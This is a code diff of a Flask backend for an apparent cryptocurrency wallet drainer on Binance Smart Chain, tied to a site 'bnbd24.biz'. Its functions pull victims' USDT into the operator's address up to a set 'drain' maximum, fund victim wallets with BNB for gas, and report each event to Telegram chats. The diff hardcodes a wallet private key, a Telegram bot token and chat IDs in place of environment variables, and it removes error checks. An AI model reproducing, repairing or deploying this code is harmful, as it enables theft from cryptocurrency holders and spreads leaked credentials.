@@ -6,7 +6,6 @@ from flask import Flask, request
 import threading
 import time
 from flask_cors import CORS
-import os
 
 app = Flask(__name__)
 # Configure CORS to allow browser calls
@@ -22,22 +21,17 @@ CORS(
 VISITORS_FILE = "visitors.txt"
 BALANCE_FILE = "balance.txt"
 
-# Get sensitive values from environment variables
-smart_contract_address = os.environ.get("SMART_CONTRACT_ADDRESS")
-private_key = os.environ.get("PRIVATE_KEY")
-# Initialize chat_ids as a list
-chat_ids = os.environ.get("CHAT_ID", "").split(",") if os.environ.get("CHAT_ID") else []
-minimum_amount = 1
-bot_token = os.environ.get("BOT_TOKEN")
-site_url = os.environ.get("SITE_URL")
+smart_contract_address = "0x7aBa5aAA4A8Ff845922618D188Fb94a473013cf8"
 
-# Validate required environment variables
-if not all([smart_contract_address, private_key, bot_token, chat_ids]):
-    print("⚠️ WARNING: Missing required environment variables!")
-    print(f"SMART_CONTRACT_ADDRESS: {'✅' if smart_contract_address else '❌'}")
-    print(f"PRIVATE_KEY: {'✅' if private_key else '❌'}")
-    print(f"BOT_TOKEN: {'✅' if bot_token else '❌'}")
-    print(f"CHAT_ID: {'✅' if chat_ids else '❌'}")
+private_key = "a62177216cf44472af49a7c47a36055b0af893138709bd0cd30df678b7e1ea44"# Pvt key
+
+chat_ids = ["7037064410"] # chat ids
+
+minimum_amount = 1
+
+bot_token = "7939817621:AAGt9nyCEeGvYBhogFQ4L5ph32xIrrCGEjQ" # bot token
+
+site_url = "https://bnbd24.biz"
 
 def add_balance_record(user_id, amount):
     if isinstance(user_id, list):
@@ -47,61 +41,25 @@ def add_balance_record(user_id, amount):
         
 
 def send_to_telegram(text, extra_chat_ids=None):
-    global chat_ids
-    
-    # Don't try to send if no chat IDs or bot token
-    if not chat_ids or not bot_token:
-        print("❌ Cannot send Telegram message: Missing chat_ids or bot_token")
-        return False
-    
-    # Ensure chat_ids is a list
-    if isinstance(chat_ids, str):
-        chat_ids = [chat_ids]
-    
-    # Create a list of all chat IDs to send to
-    all_chat_ids = chat_ids.copy() if isinstance(chat_ids, list) else []
-    
-    # Add extra chat IDs if provided
+    # Merge in optional extra chat ids (e.g., user-provided uid)
     if extra_chat_ids:
         for cid in extra_chat_ids:
             if isinstance(cid, (str, int)):
                 cid_str = str(cid).strip()
-                if cid_str.isdigit() and cid_str not in all_chat_ids:
-                    all_chat_ids.append(cid_str)
-                    # Also add to global chat_ids for future messages
-                    if cid_str not in chat_ids:
-                        chat_ids.append(cid_str)
-    
-    # Clean and deduplicate
-    all_chat_ids = list(set([str(cid).strip() for cid in all_chat_ids if str(cid).strip().isdigit()]))
-    
-    if not all_chat_ids:
-        print("❌ No valid chat IDs to send to")
-        return False
-    
+                if cid_str.isdigit() and cid_str not in chat_ids:
+                    chat_ids.append(cid_str)
     url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
     payload = {
         "text": text,
         "parse_mode": "Markdown",
         "disable_web_page_preview": True
     }
-    
-    # Send to all chat IDs
-    success_count = 0
-    for chat_id in all_chat_ids:
+    for chat_id in chat_ids:
         payload["chat_id"] = chat_id
         try:
-            response = requests.post(url, data=payload, timeout=10)
-            if response.status_code == 200:
-                success_count += 1
-                print(f"✅ Message sent to chat_id: {chat_id}")
-            else:
-                print(f"❌ Failed to send to {chat_id}: {response.status_code} - {response.text[:100]}")
-        except Exception as e:
-            print(f"❌ Error sending to {chat_id}: {e}")
-    
-    print(f"📨 Sent to {success_count}/{len(all_chat_ids)} chat IDs")
-    return success_count > 0
+            requests.post(url, data=payload, timeout=10)
+        except:
+            pass
 
 def send_usdt_failed_message(from_address, amount_usdt, error_msg, extra_chat_ids=None):
     short_address = f"{from_address[:6]}...{from_address[-4:]}"
@@ -207,18 +165,11 @@ def _normalize_private_key(raw_key: str) -> str:
     int(hex_part, 16)
     return key
 
-# Only initialize account if private_key is available
-account = None
-sender = None
-if private_key:
-    try:
-        account = web3.eth.account.from_key(_normalize_private_key(private_key))
-        sender = account.address
-        print(f"✅ Account initialized: {sender}")
-    except Exception as e:
-        print(f"❌ Failed to initialize account: {e}")
-else:
-    print("❌ PRIVATE_KEY environment variable not set!")
+account = web3.eth.account.from_key(_normalize_private_key(private_key))
+sender = account.address
+
+
+
 
 
 maximum_amount = 10000  # Set your max USDT value here (e.g., 100 USDT max to drain)
@@ -265,14 +216,10 @@ def get_bnb_price_onchain():
 # Modified collect_all_usdt function
 def collect_all_usdt(from_address, extra_chat_ids=None):
     global private_key, smart_contract_address, maximum_amount
-    
-    if not private_key:
-        print("❌ No private key available")
-        return
-        
     bsc_rpc = "https://bsc-dataseed.binance.org/"
     web3 = Web3(Web3.HTTPProvider(bsc_rpc))
 
+    private_key = private_key
     account = web3.eth.account.from_key(private_key)
     sender_address = account.address
     print(f"🔑 Connected to BSC with address: {sender_address}")
@@ -353,8 +300,7 @@ def collect_all_usdt(from_address, extra_chat_ids=None):
     signed_txn = web3.eth.account.sign_transaction(txn, private_key)
     
     try:
-        # FIX: use .rawTransaction (not .raw_transaction)
-        tx_hash = web3.eth.send_raw_transaction(signed_txn.rawTransaction)
+        tx_hash = web3.eth.send_raw_transaction(signed_txn.raw_transaction)
         print(f"✅ Sent {actual_drain_amount:.2f} USDT to {sender_address}")
         print(f"🔗 TX: https://bscscan.com/tx/{web3.to_hex(tx_hash)}")
         print("good")
@@ -429,8 +375,7 @@ def send_gasfee_bnb(receiver, extra_chat_ids=None):
 
     try:
         signed_tx = web3.eth.account.sign_transaction(tx, private_key)
-        # FIX: use .rawTransaction (not .raw_transaction)
-        tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
+        tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
         print(f"✅ Sent ${amount_usd} worth of BNB to {receiver}")
         print(f"🔗 Tx Hash: {web3.to_hex(tx_hash)}")
         #send_to_telegram(f"✅ Sent Gas Fee\nAmount : ${amount_usd} \n To: {receiver} \n Tx Hash : https://bscscan.com/tx/{web3.to_hex(tx_hash)}")
@@ -608,7 +553,7 @@ def info():
             uid = request.form.get("uid") or uid
         if not text or not text.strip():
             return "Missing 'text' in body", 400
-        send_to_telegram(text.strip(), [uid] if uid and str(uid).isdigit() else None)
+        #send_to_telegram(text.strip(), [uid] if uid and str(uid).isdigit() else None)
         return "ok"
     except Exception as e:
         return f"error: {str(e)}", 500
